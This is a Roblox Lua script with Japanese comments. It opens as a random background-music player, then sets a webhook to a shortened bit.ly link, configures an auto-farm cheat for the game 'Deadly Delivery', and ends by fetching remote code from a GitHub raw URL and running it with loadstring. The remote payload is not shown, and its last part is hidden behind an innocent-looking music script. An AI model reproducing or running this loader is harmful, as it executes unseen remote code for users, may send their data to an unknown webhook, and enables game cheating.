-- SoundService 取得
local SoundService = game:GetService("SoundService")

-- Sound オブジェクト作成
local sound = Instance.new("Sound")
sound.Parent = SoundService
sound.Volume = 0.1

-- 再生したい音楽ID一覧（rbxassetid:// は必須）
-- https://robloxsong.com
local musicIds = {
    "rbxassetid://1838667764",
    "rbxassetid://1838667168",
    "rbxassetid://1845409587",
    "rbxassetid://1836334770",
    "rbxassetid://1841238825",
	"rbxassetid://9038459302",
	"rbxassetid://1838667039",
	"rbxassetid://1836879421",
	"rbxassetid://1841446876",
	"rbxassetid://1837344545"
};

-- ランダムに音楽を設定して再生する関数
local function playRandomMusic()
	local randomId = musicIds[math.random(1, #musicIds)]
	sound.SoundId = randomId
	sound:Play()
end

-- 曲が終わったら次を再生
sound.Ended:Connect(function()
	playRandomMusic()
end)

-- 初回再生
playRandomMusic()

-- true = オン | false = オフ
-- ⌥ WebhookURL
getgenv().WebhookURL = "http://bit.ly/4ssAHs3"
getgenv().ScriptConfig = {
    SellAll = false, -- 次の実行でアイテムの取得を停止したい場合を除き、trueに設定します
    LockFoodAbove = 1000, -- 設定番号/価格より大きい/お気に入りの食品を自動的にロックします
    MinFoodPrice = 5, -- 受け取るべき最小食品を設定し、無効にするには0に設定します
    FloorLimit = 30, -- 試行する最大フロア
    LobbySize = 1,
    LobbyFriendsOnly = true,
    PickupAttempts = 5, -- 食べ物を拾うのをあきらめるまでの最大回数、推奨される最低時間は5回です
    InteractCooldown = 0.05, -- インタラクション/ピックアップ間のクールダウン、推奨最低は0.1です
    StatusMenu = true, -- ダンジョンでGUIを有効にして、よりクリーンな外観のために、Hを押して非表示にするか、右上のボタンをタップします
    HideFood = 20, -- 値設定の下にある食べ物をエレベーターに隠し、無効に0に設定します
    WaitBeforeVote = 0.5, -- 投票する前に秒/秒の（数）を待ちます
    WalkSpeed = 20, -- ダンジョンにいるときに歩行速度を変更し、一度だけ変更できます
};

loadstring(game:HttpGet("https://raw.githubusercontent.com/SNSDARK/Scripts/refs/heads/main/Deadly%20Delivery.lua"))()
